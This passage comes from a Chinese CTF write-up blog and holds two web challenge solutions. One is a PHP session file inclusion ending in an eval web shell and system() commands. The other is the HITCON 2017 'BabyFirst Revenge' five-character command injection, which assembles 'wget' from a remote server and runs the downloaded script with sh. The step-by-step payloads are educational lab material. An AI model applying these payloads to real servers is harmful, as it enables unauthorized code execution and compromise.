$mysqli-&gt;close();</div><div class="line">	&#125;</div><div class="line">	else &#123;</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">   &lt;title&gt;Login&lt;/title&gt;</div><div class="line">   &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt;</div><div class="line">   &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt;</div><div class="line">   &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">	&lt;div class="container" style="margin-top:100px"&gt;  </div><div class="line">		&lt;form action="login.php" method="post" class="well" style="width:220px;margin:0px auto;"&gt;</div><div class="line">			&lt;h3&gt;Login&lt;/h3&gt;</div><div class="line">			&lt;label&gt;Username:&lt;/label&gt;</div><div class="line">			&lt;input type="text" name="username" style="height:30px"class="span3"/&gt;</div><div class="line">			&lt;label&gt;Password:&lt;/label&gt;</div><div class="line">			&lt;input type="password" name="password" style="height:30px" class="span3"&gt;</div><div class="line"></div><div class="line">			&lt;button type="submit" class="btn btn-primary"&gt;LOGIN&lt;/button&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">&lt;?php</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="register-php"><a href="#register-php" class="headerlink" title="register.php"></a>register.php</h3><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php</div><div class="line">?action=php://filter/read=convert.base64-encode/resource=register.php</div></pre></td></tr></table></figure></p>
<p>register.php:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">if ($_POST['username'] &amp;&amp; $_POST['password']) &#123;</div><div class="line">    require_once('config.php');</div><div class="line"></div><div class="line">    $username = $_POST['username'];</div><div class="line">    $password = md5($_POST['password']);</div><div class="line"></div><div class="line">    $mysqli = @new mysqli($dbhost, $dbuser, $dbpass, $dbname);</div><div class="line">    if ($mysqli-&gt;connect_errno) &#123;</div><div class="line">        die("could not connect to the database:\n" . $mysqli-&gt;connect_error);</div><div class="line">    &#125;</div><div class="line">    $mysqli-&gt;set_charset("utf8");</div><div class="line">    $sql = "select * from user where username=?";</div><div class="line">    $stmt = $mysqli-&gt;prepare($sql);</div><div class="line">    $stmt-&gt;bind_param("s", $username);</div><div class="line">    $stmt-&gt;bind_result($res_id, $res_username, $res_password);</div><div class="line">    $stmt-&gt;execute();</div><div class="line">    $stmt-&gt;store_result();</div><div class="line">    $count = $stmt-&gt;num_rows();</div><div class="line">    if($count) &#123;</div><div class="line">        die('User name Already Exists');</div><div class="line">    &#125; else &#123;</div><div class="line">        $sql = "insert into user(username, password) values(?,?)";</div><div class="line">        $stmt = $mysqli-&gt;prepare($sql);</div><div class="line">        $stmt-&gt;bind_param("ss", $username, $password);</div><div class="line">        $stmt-&gt;execute();</div><div class="line">        echo 'Register OK!&lt;a href="index.php"&gt;Please Login&lt;/a&gt;';</div><div class="line">    &#125;</div><div class="line">    $stmt-&gt;close();</div><div class="line">    $mysqli-&gt;close();</div><div class="line">&#125; else &#123;</div><div class="line"></div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">   &lt;title&gt;Login&lt;/title&gt;</div><div class="line">   &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt;</div><div class="line">   &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt;</div><div class="line">   &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">	&lt;div class="container" style="margin-top:100px"&gt;  </div><div class="line">		&lt;form action="register.php" method="post" class="well" style="width:220px;margin:0px auto;"&gt;</div><div class="line">			&lt;h3&gt;Register&lt;/h3&gt;</div><div class="line">			&lt;label&gt;Username:&lt;/label&gt;</div><div class="line">			&lt;input type="text" name="username" style="height:30px"class="span3"/&gt;</div><div class="line">			&lt;label&gt;Password:&lt;/label&gt;</div><div class="line">			&lt;input type="password" name="password" style="height:30px" class="span3"&gt;</div><div class="line"></div><div class="line">			&lt;button type="submit" class="btn btn-primary"&gt;REGISTER&lt;/button&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">&lt;?php</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="config-php"><a href="#config-php" class="headerlink" title="config.php"></a>config.php</h3><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php</div><div class="line">?action=php://filter/read=convert.base64-encode/resource=config.php</div></pre></td></tr></table></figure></p>
<p>config.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$dbhost = &apos;localhost&apos;;</div><div class="line">$dbuser = &apos;web&apos;;</div><div class="line">$dbpass = &apos;webpass123&apos;;</div><div class="line">$dbname = &apos;web&apos;;</div><div class="line"> ?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><p>index.php源码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line">session_start();</div><div class="line">if (isset($_GET['action'])) &#123;</div><div class="line">    include $_GET['action'];</div><div class="line">    exit();</div><div class="line">&#125; else &#123;</div><div class="line">?&gt;</div><div class="line"></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang="en"&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset="utf-8"&gt;</div><div class="line">    &lt;title&gt;Login&lt;/title&gt;</div><div class="line">    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</div><div class="line">    &lt;link href="css/bootstrap.css" rel="stylesheet" media="screen"&gt;</div><div class="line">    &lt;link href="css/main.css" rel="stylesheet" media="screen"&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;div class="container"&gt;</div><div class="line">    &lt;div class="form-signin"&gt;</div><div class="line">        &lt;?php if (isset($_SESSION['username'])) &#123; ?&gt;</div><div class="line">            &lt;?php echo "&lt;div class=\"alert alert-success\"&gt;You have been &lt;strong&gt;successfully logged in&lt;/strong&gt;.&lt;/div&gt;</div><div class="line">&lt;a href=\"index.php?action=logout.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Logout&lt;/a&gt;";&#125;else&#123; ?&gt;</div><div class="line">            &lt;?php echo "&lt;div class=\"alert alert-warning\"&gt;Please Login.&lt;/div&gt;</div><div class="line">&lt;a href=\"index.php?action=login.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Login&lt;/a&gt;</div><div class="line">&lt;a href=\"index.php?action=register.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Register&lt;/a&gt;";</div><div class="line">        &#125; ?&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"></div><div class="line">&lt;?php</div><div class="line"></div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="SQL注入？"><a href="#SQL注入？" class="headerlink" title="SQL注入？"></a>SQL注入？</h3><p>往往注册与登陆操作中会有与数据库交互的地方，这也是sql注入的常见引发点。</p>
<p>看一下register.php，这里仅截取部分代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># register.php</span></div><div class="line"></div><div class="line">$mysqli-&gt;set_charset(<span class="string">"utf8"</span>);</div><div class="line">$sql = <span class="string">"select * from user where username=?"</span>;</div><div class="line">$stmt = $mysqli-&gt;prepare($sql);</div><div class="line">$stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</div><div class="line">$stmt-&gt;bind_result($res_id, $res_username, $res_password);</div><div class="line">$stmt-&gt;execute();</div><div class="line">$stmt-&gt;store_result();</div></pre></td></tr></table></figure></p>
<p>再看一下login.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># login.php</span></div><div class="line"></div><div class="line">$sql = <span class="string">"select password from user where username=?"</span>;</div><div class="line">$stmt = $mysqli-&gt;prepare($sql);</div><div class="line">$stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</div><div class="line">$stmt-&gt;bind_result($res_password);</div><div class="line">$stmt-&gt;execute();</div><div class="line">$stmt-&gt;fetch();</div></pre></td></tr></table></figure></p>
<p>这里都使用了PHP的PDO处理，因此这里存在sql注入的可能性很小。</p>
<h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>接着再看看，有哪些参数是可控的。</p>
<p>在login.php中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 第3行</span></div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>]) &#123;</div><div class="line">	header(<span class="string">'Location: index.php'</span>);</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment"># 第8行</span></div><div class="line"><span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</div><div class="line">	$username = $_POST[<span class="string">'username'</span>];</div><div class="line"></div><div class="line"><span class="comment"># 第20行</span></div><div class="line">	$stmt-&gt;bind_result($res_password);</div><div class="line"><span class="comment"># 第24行</span></div><div class="line">	<span class="keyword">if</span> ($res_password == $password) &#123;</div><div class="line">		$_SESSION[<span class="string">'username'</span>] = base64_encode($username);</div><div class="line">		header(<span class="string">"location:index.php"</span>);</div></pre></td></tr></table></figure></p>
<p>这里使用了session来保存用户会话，<a href="http://php.net/manual/zh/session.examples.basic.php" target="_blank" rel="external">php手册</a>中是这样描述的：</p>
<ol>
<li>PHP 会将会话中的数据设置到 <code>$_SESSION</code> 变量中。</li>
<li>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</li>
<li>对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</li>
</ol>
<p>考虑到变量<code>$username</code>是我们可控的，并且被设置到了<code>$_SESSION</code>中，因此我们输入的数据未经过滤的就被写入到了对应的sessioin文件中。结合前面的php文件包含，可以推测这里可以包含session文件。关于session包含的相关知识，可以见这篇文章<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession">chybeta:PHP文件包含</a></p>
<p>要包含session文件，需要知道文件的路径。先注册一个用户，比如chybeta。等登陆成功后。记录下cookie中的PHPSESSID的值，这里为udu8pr09fjvabtoip8icgurt85<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/7.png?raw=true" alt=""></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php?action=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/6.png?raw=true" alt=""></p>
<p>这个<code>/var/lib/php5/</code>的session文件路径是测试出来的，常见的也就如<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession">chybeta:PHP文件包含</a>中所述的几种。</p>
<h3 id="base64-encode"><a href="#base64-encode" class="headerlink" title="base64_encode"></a>base64_encode</h3><p>能包含，并且控制session文件，但要写入可用的payload，还需要绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_SESSION[&apos;username&apos;] = base64_encode($username);</div></pre></td></tr></table></figure></p>
<p>如前面所示，输入的用户名会被base64加密。如果直接用php伪协议来解密整个session文件，由于序列化的前缀，势必导致乱码。</p>
<p>考虑一下base64的编码过程。比如编码abc。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">未编码: abc</div><div class="line">转成ascii码： 97 98 99</div><div class="line">转成对应二进制（三组，每组8位）： 01100001 01100010 01100011</div><div class="line">重分组（四组，每组6位）： 011000 010110 001001 100011</div><div class="line">每组高位补零，变为每组8位：00011000 00010110 00001001 00100011</div><div class="line">每组对应转为十进制： 24 22 9 35</div><div class="line">查表得： Y W J j</div></pre></td></tr></table></figure></p>
<p>考虑一下session的前缀：<code>username|s:12:&quot;</code>，中间的数字12表示后面base64串的长度。当base64串的长度小于100时，前缀的长度固定为15个字符，当base64串的长度大于100小于1000时，前缀的长度固定为16个字符。</p>
<p>由于16个字符，恰好满足一下条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">16个字符 =&gt; 16 * 6 = 96 位 =&gt; 96 mod 8 = 0</div></pre></td></tr></table></figure></p>
<p>也就是说，当对session文件进行base64解密时，前16个字符固然被解密为乱码，但不会再影响从第17个字符后的部分也就是base64加密后的username。</p>
<h2 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h2><p>注册一个账号，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybetachybetachybetachybetachybetachybetachybetachybetachybeta&lt;?php eval($_GET[&apos;atebyhc&apos;]) ?&gt;</div></pre></td></tr></table></figure></p>
<p>其base64加密后的长度为128，大于100。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/8.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php</div><div class="line">?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85</div><div class="line">&amp;atebyhc=phpinfo();</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/9.png?raw=true" alt=""><br>成功getshell。</p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=system(&apos;ls /&apos;);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/10.png?raw=true" alt=""></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=system(&apos;cat /fffflllllaaaagggg.txt&apos;);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/11.png?raw=true" alt=""></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>考了几个知识点：</p>
<ol>
<li>php文件包含：伪协议利用</li>
<li>php文件包含：包含session文件</li>
<li>php-session知识及序列化格式</li>
<li>base64的基本原理</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天在群里看到了几道题，这是其中之一。&lt;br&gt;PHP文件包含 Session&lt;/p&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="php文件包含" scheme="http://chybeta.github.io/tags/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2017-BabyFirst Revenge-writeup</title>
    <link href="http://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/"/>
    <id>http://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/</id>
    <published>2017-11-04T15:32:08.000Z</published>
    <updated>2017-11-06T07:28:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>HITCON CTF 2017-BabyFirst Revenge-writeup<br><a id="more"></a></p>
<h1 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Do you remember BabyFirst from HITCON CTF 2015?</div><div class="line">This is the harder version!</div><div class="line">http://52.199.204.34/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>点开后，发现给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">   $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">   @mkdir($sandbox);</div><div class="line">   @chdir($sandbox);</div><div class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</div><div class="line">	   @exec($_GET[<span class="string">'cmd'</span>]);</div><div class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</div><div class="line">	   @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</div><div class="line">   &#125;</div><div class="line">   highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure></p>
<p>简要的分析一下：</p>
<ol>
<li>对每个REMOTE_ADDR有对应的sandbox</li>
<li>能执行长度&lt;=5的命令</li>
<li>提供了reset功能。</li>
</ol>
<p>之前在总结时，有遇到过，见<a href="https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html" target="_blank" rel="external">chybeta:wafbypass</a>，github地址为：<a href="https://github.com/CHYbeta/WAF-Bypass" target="_blank" rel="external">https://github.com/CHYbeta/WAF-Bypass</a></p>
<p>原本的长度为8，而这里为5，条件苛刻了许多。在原本的场景中，我们可以通过构造文件名，之后利用ls命令及其参数将所需的shell命令写入到一个新文件中，并sh执行该新文件从而达到任意命令执行。这里同样可以借鉴其思路。关键点有两个：</p>
<ol>
<li>长度限制</li>
<li>写入的顺序</li>
</ol>
<p>这里先补充一些基本的知识。在linux中，倘若命令过长，可以用续行符（<code>\</code>）来将一行命令变为多行来写。具体例子如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat chybeta</div><div class="line"><span class="built_in">echo</span>\</div><div class="line"> <span class="string">"chy\</span></div><div class="line">beta"</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ sh chybeta</div><div class="line">chybeta</div></pre></td></tr></table></figure></p>
<p>在文件chybeta中，通过<code>\</code>将命令<code>echo &quot;chybeta&quot;</code>分成了三个部分。</p>
<p>倘若有一行出错呢？见下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat chybeta</div><div class="line">atebyhc</div><div class="line"><span class="built_in">echo</span>\</div><div class="line"> <span class="string">"chy\</span></div><div class="line">beta"</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ sh chybeta</div><div class="line">chybeta: 1: chybeta: atebyhc: not found</div><div class="line">chybeta</div></pre></td></tr></table></figure></p>
<p>在最前我加了一句<code>atebyhc</code>，显然这不是命令，但这并不妨碍之后语句的执行，仍然能在<code>\</code>的作用下打印出<code>chybeta</code>。</p>
<p>接下来考虑如何构造文件。由于长度的限制，我们不能通过直接的<code>ls -t</code>来通过时间来进行文件名排序并构造。但我们可以曲线救国，先想办法把<code>ls -t&gt;q</code>写入到某个文件中，假设为文件a，然后sh执行文件a，这样命令<code>ls -t</code>的结果就能输出到文件q中。</p>
<p>我最后形成的payload1如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;-t\</div><div class="line">&gt;\&gt;q</div><div class="line">&gt;l\</div><div class="line">&gt;s\ \</div><div class="line">ls&gt;a</div><div class="line">ls&gt;&gt;a</div></pre></td></tr></table></figure></p>
<p>这里详细解释。在默认情况下，命令ls，根据名称排序，空格等最前，数字其次，字母最后。当我们执行了前四条语句后，这时文件夹中情况如下(这是我本地环境)：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/2.png?raw=true" alt=""></p>
<p>接着执行<code>ls&gt;a</code>后，a中文件内容：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/3.png?raw=true" alt=""></p>
<p>紧接着执行<code>ls&gt;&gt;a</code>，这个命令会将<code>ls</code>的结果追加到文件a中：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/4.png?raw=true" alt=""></p>
<p>其文本内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-t\</div><div class="line">&gt;q</div><div class="line">a</div><div class="line">l\</div><div class="line">s \</div><div class="line">-t\</div><div class="line">&gt;q</div><div class="line">a</div><div class="line">l\</div><div class="line">s \</div></pre></td></tr></table></figure></p>
<p>由前面所述，错误的命令不会影响后面正确语句的正确执行，所以第一行到第三行是错误的命令可忽略，并且第三行<code>a</code>后没有续行符，这不会影响到下一行。从第四行到第七行，由于续行符（<code>\</code>），可以构成如下的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">l\</div><div class="line">s \</div><div class="line">-t\</div><div class="line">&gt;q</div></pre></td></tr></table></figure></p>
<p>也即<code>ls -t&gt;q</code>，能够根据文件的时间来进行排序并将结果写入到文件q中。剩余几行，对结果无影响可忽略。</p>
<p>接下来延续以前的套路，想办法wget远程的某个文件，这样文件中能藏有足够长的payload。为方便起见-，可以将远程服务器的ip转换为十进制，这样不用考虑小数点带来的影响。假设我们的ip转换成十进制后为：2077173*48（hh这里我隐去一位数字）。则命令<code>wget 2077173*48</code>，会从<code>2077173*48</code>处下载并默认保存为index.html。考虑到长度的限制，我们需要将上述命令分段成长度小于等于5，并用续行符<code>\</code>隔开。考虑到，前面是使用<code>ls -t&gt;q</code>，而参数<code>-t</code>，会让新生成的文件排在前面，越早生成的文件排在后面。所以构造这一部分的payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;*48</div><div class="line">&gt;173\</div><div class="line">&gt;077\</div><div class="line">&gt;\ 2\</div><div class="line">&gt;et\</div><div class="line">&gt;wg\</div></pre></td></tr></table></figure></p>
<p>此时文件目录为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/5.png?raw=true" alt=""></p>
<p>接着执行命令<code>sh a</code>，注意文件a是我们第一阶段时生成的，其中包含命令<code>ls -t&gt;q</code>。运行完后查看新生成的文件q：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/6.png?raw=true" alt=""></p>
<p>如前所述，这里构成了一个新的命令<code>wget 2077173*48</code>。注意在<code>*48</code>的下一行是文件<code>a</code>的名字，由于它后面没有<code>\</code>，并且字母顺序在<code>s\</code>之前，刚好起了一个分割的作用。</p>
<p>接下来执行命令<code>sh q</code>，这里为演示方便在本地shell中操作，这跟访问<code>?cmd=sh%20a</code>的效果是一样的:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/7.png?raw=true" alt=""></p>
<p>可以发现成功的下载了远程的文件并保存到index.html中，而index.html是存放在我们自己的服务器上的，只要执行<code>sh%20i*</code>，注意这里用来通配符<code>*</code>，就能够执行<code>sh index.html</code>，从而执行其中的命令。</p>
<p>接下来，需要不断的进行探索flag的所在地。可以按照下述命令来实现命令的执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?cmd=rm%20i*   // 删除index.html</div><div class="line">?cmd=sh%20a    // 执行文件q，即wget新的index.html</div><div class="line">?cmd=sh%20i*   // 执行index.html中的shell命令</div></pre></td></tr></table></figure></p>
<p>在经过一番摸索后，发现在home目录的某个用户的主目录下有README.txt，其内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Flag is in the MySQL database</div><div class="line">fl4444g / SugZXUtgeJ52_Bvr</div></pre></td></tr></table></figure></p>
<p>接下去通过替换index.html的内容。</p>
